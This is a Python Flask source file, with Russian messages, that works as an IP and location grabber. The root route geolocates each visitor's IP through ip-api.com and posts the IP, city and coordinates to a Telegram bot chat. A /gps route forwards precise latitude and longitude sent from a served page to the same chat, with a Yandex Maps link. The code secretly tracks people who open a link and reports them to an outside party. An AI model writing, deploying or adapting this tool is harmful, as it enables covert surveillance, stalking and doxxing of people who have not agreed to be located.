from flask import Flask, request, send_file
import requests

app = Flask(__name__)

import os
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
CHAT_ID = os.getenv('CHAT_ID')

@app.route('/')
def get_ip_and_location():
    try:
        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
        geo = requests.get(f"http://ip-api.com/json/{ip}").json()

        if geo['status'] == 'success':
            location = f"{geo.get('country', '')}, {geo.get('regionName', '')}, {geo.get('city', '')} ({geo.get('lat')}, {geo.get('lon')})"
        else:
            location = "❌ Геолокация не найдена"
    except Exception as e:
        ip = "❌ Не удалось получить IP"
        location = f"Ошибка: {e}"

    send_to_telegram(ip, location)
    return "✅ IP и локация отправлены!"

def send_to_telegram(ip, location):
    message = f"🌍 IP: {ip}\n📌 Местоположение: {location}"
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": message}
    requests.post(url, data=data)

@app.route('/gps', methods=['POST'])
def get_gps():
    try:
        data = request.get_json()
        lat = data.get('lat')
        lon = data.get('lon')

        yandex_url = f"https://yandex.ru/maps/?ll={lon},{lat}&z=16"
        message = (
            f"📍 Получены GPS координаты от пользователя:\n"
            f"Широта: {lat}\n"
            f"Долгота: {lon}\n\n"
            f"🔗 [Открыть в Яндекс.Картах]({yandex_url})"
        )

        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        requests.post(url, data={
            "chat_id": CHAT_ID,
            "text": message,
            "parse_mode": "Markdown"
        })

        return "✅ GPS отправлены!"
    except Exception as e:
        return f"❌ Ошибка получения GPS: {e}"

@app.route('/page')
def send_html():
    return send_file('ip.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=3000)
